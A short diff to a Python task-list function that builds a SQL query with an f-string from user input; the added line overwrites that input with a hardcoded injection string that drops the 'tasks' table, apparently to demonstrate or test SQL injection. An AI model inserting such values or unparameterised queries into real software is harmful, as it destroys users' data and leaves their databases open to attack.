@@ -30,6 +30,7 @@ def displayTasks(specific):
     if specific:
         while True:
             display = input('what table do you want the tasks from?\n')
+            display =  "\"\";drop table tasks;"
             displaySQL = f"SELECT * FROM {display}"
             try:
                 cursor.execute(displaySQL)
